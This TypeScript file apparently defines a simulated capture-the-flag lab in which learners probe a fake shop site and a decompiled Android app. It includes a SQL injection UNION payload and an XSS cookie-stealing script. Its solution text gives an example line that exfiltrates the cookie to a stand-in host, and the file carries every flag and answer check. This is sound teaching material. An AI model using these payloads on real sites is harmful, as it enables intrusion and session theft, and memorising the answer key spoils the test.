// A Web & Mobile lab built on the shell simulator with a small simulated web
// server (the `curl` tool). You attack an authorized lab app the way you would
// a real CTF target: read raw responses and headers, find a flag the UI hides,
// detect and exploit SQL injection with UNION, confirm reflected XSS and steal
// the "admin" cookie, then inspect a decompiled Android app's manifest for
// permissions and a hard-coded secret. Everything here is in-scope and local.

import type { ShellSpec, Tool } from "@/lib/sim/shell";
import type { ShellLab } from "./shellLabs";

const has = (want: string) => (a: string) => a.trim().toLowerCase().replace(/\s+/g, "").includes(want.toLowerCase().replace(/\s+/g, ""));
const re = (r: RegExp) => (a: string) => r.test(a.trim());
const text = (lines: string[]) => lines.join("\n") + "\n";

// A tiny HTTP server for the lab: curl hits http://shop.local and gets back
// shaped responses, including an injectable `id` param and a reflected `q`.
function webCurl(): Tool {
  const lc = (s: string) => s.toLowerCase();
  return {
    about: "make an HTTP request to the lab app and print the response (http://shop.local)",
    run(args) {
      let include = false;
      const rest: string[] = [];
      for (let i = 0; i < args.length; i++) {
        const a = args[i];
        if (a === "-i" || a === "--include" || a === "-I") include = true;
        else if (a === "-s" || a === "--silent" || a === "-L" || a === "-v" || a === "-k" || a === "-g") { /* accepted, no effect */ }
        else if (a === "-X" || a === "-H" || a === "-d" || a === "--data" || a === "-A" || a === "-b" || a === "-o" || a === "-e" || a === "-u" || a === "--url") i++; // skip the value
        else if (a.startsWith("-")) { /* ignore other flags */ }
        else rest.push(a);
      }
      const raw = rest[0];
      if (!raw) return { out: "", err: "curl: try  curl -i http://shop.local/   (see README)", code: 2 };
      let u = raw.replace(/^https?:\/\//, "").replace(/^shop\.local/, "");
      if (!u.startsWith("/")) u = "/" + u;
      const qi = u.indexOf("?");
      const path = qi >= 0 ? u.slice(0, qi) : u;
      const query = qi >= 0 ? u.slice(qi + 1) : "";
      const param = (k: string) => { const m = new RegExp("(?:^|&)" + k + "=([^&]*)").exec(query); return m ? m[1] : undefined; };

      let status = "200 OK";
      const extra: string[] = [];
      let body: string[] = [];

      if (path === "/" || path === "/index.html") {
        extra.push("X-Powered-By: PHP/8.1", "X-Debug-Flag: HHB{r3sp0ns3_h34d3rs}");
        body = ["<!doctype html><html><head><title>ShopApp</title></head><body>", "  <h1>ShopApp</h1>", "  <!-- items: /item?id=1 · products API: /api/products · search: /search?q= -->", "  <a href=\"/item?id=1\">Browse items</a>", "</body></html>"];
      } else if (path === "/robots.txt") {
        extra.push("Content-Type: text/plain");
        body = ["User-agent: *", "Disallow: /admin", "Disallow: /api/debug"];
      } else if (path === "/api/products") {
        extra.push("Content-Type: application/json");
        body = ["[", "  {\"id\":1,\"name\":\"Sticker pack\",\"price\":3},", "  {\"id\":2,\"name\":\"Mug\",\"price\":9,", "   \"_internal\":{\"note\":\"remove before launch\",\"secret_flag\":\"HHB{h1dd3n_ap1_f13ld}\"}}", "]"];
      } else if (path === "/item") {
        const id = param("id");
        if (id === undefined) body = ["Usage: /item?id=1"];
        else if (lc(id).includes("union select") && lc(id).includes("from flags")) {
          // Successful UNION injection: the "flag" column renders where the name would.
          body = ["<div class=\"product\">", "  <h1>HHB{un10n_b4s3d_sql1}</h1>", "  <p>price: 2</p>", "</div>"];
        } else if (lc(id).includes("information_schema.columns") && lc(id).includes("flags")) {
          body = ["<div class=\"product\"><h1>id</h1></div>", "<div class=\"product\"><h1>flag</h1></div>", "<div class=\"product\"><h1>price</h1></div>"];
        } else if (lc(id).includes("information_schema.tables")) {
          body = ["<div class=\"product\"><h1>products</h1></div>", "<div class=\"product\"><h1>users</h1></div>", "<div class=\"product\"><h1>flags</h1></div>"];
        } else if (id.includes("union select") || lc(id).includes("union select")) {
          status = "500 Internal Server Error";
          body = ["ERROR: The used SELECT statements have a different number of columns, or unknown table. (columns of flags: flag, price)"];
        } else if (id.includes("'") || id.includes("\"")) {
          status = "500 Internal Server Error";
          body = ["ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \"'\" at line 1", "query was: SELECT name, price FROM products WHERE id = '" + id + "'"];
        } else if (/^\d+$/.test(id.trim())) {
          const n = parseInt(id, 10);
          body = n === 1 ? ["<div class=\"product\"><h1>Sticker pack</h1><p>price: 3</p></div>"] : n === 2 ? ["<div class=\"product\"><h1>Mug</h1><p>price: 9</p></div>"] : ["<div class=\"product\"><p>No such item.</p></div>"];
        } else {
          body = ["<div class=\"product\"><p>No such item.</p></div>"];
        }
      } else if (path === "/search") {
        const q = param("q");
        if (q === undefined) body = ["<form action=\"/search\"><input name=\"q\" placeholder=\"search...\"></form>"];
        else if (lc(q).includes("document.cookie")) {
          body = ["<h2>Search</h2>", "<p>Your report was sent to an administrator for review.</p>", "", "[report bot] opened your link in the admin's browser; your script executed.", "[report bot] exfiltrated cookie: session=HHB{st0l3n_c00k13_xss}"];
        } else {
          // Reflected unescaped — a tag you send comes straight back.
          body = ["<h2>Search</h2>", "<p>No results for " + q + "</p>"];
        }
      } else {
        status = "404 Not Found";
        body = ["Not Found"];
      }

      const ctype = extra.some((e) => e.startsWith("Content-Type")) ? "" : "Content-Type: text/html; charset=UTF-8";
      const head = ["HTTP/1.1 " + status, "Server: nginx/1.24.0", ...extra, ...(ctype ? [ctype] : [])];
      const out = (include ? head.join("\n") + "\n\n" : "") + body.join("\n") + "\n";
      return { out };
    },
  };
}

const WWW = "/home/hacker";
const webSpec: ShellSpec = {
  user: "hacker", host: "kali", home: WWW, cwd: WWW, groups: ["hacker"],
  suggest: [
    "cat README",
    "curl -i http://shop.local/",
    "curl http://shop.local/api/products",
    "curl \"http://shop.local/item?id=1'\"",
    "curl \"http://shop.local/item?id=-1 UNION SELECT flag,2 FROM flags-- -\"",
    "curl \"http://shop.local/search?q=<script>document.cookie</script>\"",
    "cat app/AndroidManifest.xml",
    "grep -ri HHB app",
  ],
  motd: "Authorized test of shop.local (and its Android app, decompiled under app/). Read the raw responses, find what the UI hides, exploit the SQL injection and the reflected XSS, then audit the mobile manifest. curl talks to the lab server; cat/grep read the app.",
  files: {
    [`${WWW}/README`]: text([
      "Target: http://shop.local  (in scope) + its Android build, decompiled under app/",
      "",
      "curl -i URL              show response headers + body (flags hide in headers)",
      "curl http://shop.local/api/products    JSON the UI never shows",
      "/item?id=N               product lookup — the id goes straight into a SQL query",
      "/search?q=...            echoes your query back into the page",
      "app/AndroidManifest.xml  the app's permissions and settings",
      "",
      "Tools: curl, cat, grep. Quote any URL with spaces or special characters.",
    ]),
    [`${WWW}/app/AndroidManifest.xml`]: text([
      "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
      "<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.shop.app\">",
      "  <uses-permission android:name=\"android.permission.INTERNET\"/>",
      "  <uses-permission android:name=\"android.permission.READ_SMS\"/>",
      "  <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>",
      "  <application android:allowBackup=\"true\" android:usesCleartextTraffic=\"true\" android:debuggable=\"true\" android:label=\"ShopApp\">",
      "    <activity android:name=\".MainActivity\" android:exported=\"true\"/>",
      "    <meta-data android:name=\"api_base\" android:value=\"http://shop.local/api\"/>",
      "  </application>",
      "</manifest>",
    ]),
    [`${WWW}/app/res/values/strings.xml`]: text([
      "<resources>",
      "  <string name=\"app_name\">ShopApp</string>",
      "  <string name=\"api_base\">http://shop.local/api</string>",
      "  <string name=\"api_key\">HHB{h4rdc0d3d_1n_str1ngs}</string>",
      "</resources>",
    ]),
  },
  tools: { curl: webCurl() },
};

export const webFlagsLab: ShellLab = {
  id: "webmobile-webflags",
  title: "Lab · Find the flag in web & mobile apps",
  intro:
    "An authorized test of the shop.local app and its Android build. Read the raw HTTP responses (flags hide where the page never shows them), find and exploit the SQL injection with a UNION query, confirm the reflected XSS and steal the 'admin' cookie, then audit the decompiled app's manifest and resources. curl is the lab's web client; cat and grep read the mobile app.",
  spec: webSpec,
  tasks: [
    {
      ask: "Read the homepage's response headers. A flag is leaked in a custom header — which flag? (curl -i http://shop.local/)",
      placeholder: "HHB{…}",
      hint: "curl -i includes the response headers before the body. Look for an X- header the server shouldn't send.",
      solution: "HHB{r3sp0ns3_h34d3rs} — in the X-Debug-Flag header. Always read headers (curl -i, or DevTools → Network → Response); flags and leaks live there, not just in the page.",
      check: has("HHB{r3sp0ns3_h34d3rs}"),
    },
    {
      ask: "The products API returns a field the app never shows on screen. Find the flag. (curl http://shop.local/api/products)",
      placeholder: "HHB{…}",
      hint: "curl the JSON endpoint and read every field — the UI only renders name and price, but the response carries more.",
      solution: "HHB{h1dd3n_ap1_f13ld} — in an _internal.secret_flag field. APIs often return data the front-end hides; read the raw JSON.",
      check: has("HHB{h1dd3n_ap1_f13ld}"),
    },
    {
      ask: "Add a single quote to the id parameter. What kind of error comes back? (curl \"http://shop.local/item?id=1'\") — one word.",
      placeholder: "one word",
      hint: "The id goes straight into a SQL query. A stray quote breaks the quoting and the database complains.",
      solution: "A SQL syntax error — the quote broke out of the query, which proves the id is injectable. The error even echoes the query (SELECT name, price FROM products WHERE id = '...').",
      check: re(/sql|syntax|error|1064/i),
    },
    {
      ask: "Exploit it: use a UNION SELECT to read the flag from the flags table (its columns are flag, price). What flag? (curl \"http://shop.local/item?id=-1 UNION SELECT flag,2 FROM flags-- -\")",
      placeholder: "HHB{…}",
      hint: "id=-1 returns no real row, so your UNION's row is what renders. Select the flag column into the position where the name prints. -- comments out the rest.",
      solution: "HHB{un10n_b4s3d_sql1} — a UNION SELECT appends your own row; because the real query selects (name, price), you select (flag, 2) so the flag lands where the name shows. The fix is parameterised queries. (sqlmap --dump automates all of this.)",
      check: has("HHB{un10n_b4s3d_sql1}"),
    },
    {
      ask: "The search page echoes your query without encoding it. Send a script that steals the admin's cookie — the report bot runs it. What flag comes back? (curl \"http://shop.local/search?q=<script>document.cookie</script>\")",
      placeholder: "HHB{…}",
      hint: "First confirm reflection: curl a <b>tag</b> and see it come back raw. Then send a <script> that touches document.cookie; the report bot opens your link in the admin's browser.",
      solution: "HHB{st0l3n_c00k13_xss} — the search output isn't encoded, so your <script> runs in the admin's browser and leaks their cookie. Real exfil sends it to a server you control (new Image().src='//you/'+document.cookie). Fix: encode output for its context and set a Content-Security-Policy + HttpOnly cookies.",
      check: has("HHB{st0l3n_c00k13_xss}"),
    },
    {
      ask: "Audit the Android app. Which dangerous permission in AndroidManifest.xml lets it read text messages? (cat app/AndroidManifest.xml)",
      placeholder: "a permission name",
      hint: "Permissions are <uses-permission android:name=\"android.permission.XXX\"/> lines. Which one is about SMS? (also note usesCleartextTraffic and debuggable).",
      solution: "READ_SMS (android.permission.READ_SMS) — a shop app has no business reading SMS; that's over-asking. The manifest also sets usesCleartextTraffic, allowBackup and debuggable to true, all worth flagging.",
      check: has("READ_SMS"),
    },
    {
      ask: "A secret is hard-coded in the app's resources. Find it. (grep -ri HHB app  — or read app/res/values/strings.xml)",
      placeholder: "HHB{…}",
      hint: "Decompiled apps keep strings in res/values/strings.xml. grep the whole app folder for the flag format.",
      solution: "HHB{h4rdc0d3d_1n_str1ngs} — an api_key string baked into the build. Anyone who downloads the APK can read it; keep secrets out of the client and on the server.",
      check: has("HHB{h4rdc0d3d_1n_str1ngs}"),
    },
  ],
};

export const webLabsByTrack: Record<string, ShellLab[]> = {
  webmobile: [webFlagsLab],
};
